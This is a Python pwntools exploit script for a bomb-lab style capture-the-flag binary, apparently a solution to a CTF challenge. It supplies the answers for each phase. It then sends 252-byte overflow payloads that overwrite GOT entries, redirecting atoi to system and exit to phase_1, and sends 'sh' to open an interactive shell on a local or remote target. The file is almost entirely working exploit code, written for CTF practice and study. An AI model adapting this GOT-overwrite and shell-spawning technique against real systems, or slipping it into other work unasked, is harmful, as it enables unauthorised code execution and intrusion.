#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import os
import sys

elfPath = "./wTEdNnGnqZHQigN8.Pwn02"
libcPath = ""
remoteAddr = "192.168.32.123"
remotePort = 8000

context.binary = elfPath
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

elf = context.binary
if sys.argv[1] == "l":
    context.log_level = "debug"
    io = process(elfPath, env = {"LD_PRELOAD": libcPath})
    if libcPath:
        libc = ELF(libcPath)

else:
    context.log_level = "debug"
    io = remote(remoteAddr, remotePort)
    if libcPath:
        libc = ELF(libcPath)

success = lambda name, value: log.success("{} -> {:#x}".format(name, value))

def DEBUG(bps = [], pie = False):
    cmd = "set follow-fork-mode parent\n"
    if pie:
        base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[1], 16)
        cmd += ''.join(['b *{:#x}\n'.format(b + base) for b in bps])
    else:
        cmd += ''.join(['b *{:#x}\n'.format(b) for b in bps])

    if bps != []:
        cmd += "c"

    raw_input("DEBUG: ")
    gdb.attach(io, cmd)

if __name__ == "__main__":
    '''
    https://github.com/VulnHub/ctf-writeups/blob/master/2016/sctf/bomb_squad.md
    '''
    #  DEBUG([0x80487f7])
    io.sendlineafter("number!\n", "8584")
    payload = "[1, 1, 3, 5, 11, 21]"
    io.sendlineafter("numbers!\n", payload)
    payload = "mappingstringsforfunandprofit{"
    io.sendlineafter("right?\n", payload)
    #  DEBUG([0x8048914])
    payload = "1 1 2 2 1 1 3"
    io.sendlineafter("4.\n", payload)

    io.sendafter(": ", p32(elf.sym['__nr']) * 2)
    #  io.sendafter(": ", "aaaaaaaa")
    io.sendafter(": ", p32(elf.sym['__nr']) * 2)
    io.sendafter(": ", p32(elf.plt['exit']) * 2)
    io.sendafter(": ", '00000000')
    io.sendafter(": ", '00000000')
    io.sendafter(": ", '00000000')

    #  DEBUG([0x8048D00, 0x80487f7])
    io.sendline('a' * 252 + p32(elf.got['atoi']))
    io.sendline(p32(elf.plt['system']))

    io.sendline('a' * 252 + p32(elf.got['exit']))
    io.sendline(p32(elf.sym['phase_1']))

    io.sendline("sh\0")

    io.interactive()
    io.close()
